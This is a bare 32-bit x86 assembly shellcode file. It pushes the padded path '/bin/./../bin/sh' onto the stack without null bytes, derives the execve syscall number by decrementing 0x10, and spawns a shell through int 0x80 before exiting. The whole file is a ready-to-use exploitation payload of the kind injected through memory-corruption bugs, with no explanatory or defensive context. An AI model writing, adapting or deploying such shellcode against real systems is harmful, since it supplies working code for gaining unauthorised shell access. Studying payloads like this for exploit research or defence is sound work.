BITS 32
	xor ecx, ecx
	xor edx, edx
	push edx 	; push null to terminate the string
	push "n/sh" ;"/bin/./../bin/sh" streted out to fit 32 bit width stack
	push "./bi"
	push "/./."
	push "/bin"
	mov ebx, esp
	mov al, 0x10
	dec eax
	dec eax
	dec eax
	dec eax
	dec eax
	int 0x80

	xor eax, eax
	inc eax
	int 0x80
